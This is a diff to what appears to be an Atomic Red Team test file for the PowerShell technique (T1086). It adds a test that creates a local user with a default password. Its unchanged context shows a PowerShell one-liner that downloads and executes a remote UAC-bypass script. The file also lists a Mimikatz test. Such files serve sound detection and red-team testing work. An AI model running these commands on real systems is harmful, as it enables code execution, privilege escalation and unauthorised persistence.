@@ -1,6 +1,6 @@
 ---
 attack_technique: T1086
-display_name: TODO
+display_name: PowerShell
 
 atomic_tests:
 - name: Mimikatz
@@ -86,3 +86,32 @@ atomic_tests:
     command: |
       Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"
       C:\Windows\System32\cmd.exe
+
+- name: PowerShell Add User
+  description: |
+    Using PS 5.1, add a user via CLI
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    user_name:
+      description: username to add
+      type: string
+      default: atomic_user
+    full_name:
+      description: Full name of user
+      type: string
+      default: Atomic Red Team
+    password:
+      description: password to use
+      type: string
+      default: ATOM1CR3DT3@M
+    description:
+      description: Brief description of account
+      type: string
+      default: Atomic Things
+  executor:
+    name: command_prompt
+    command: |
+      New-LocalUser -FullName '${full_name}' -Name '${user_name}' -Password ${password} ‑Description '${description}'
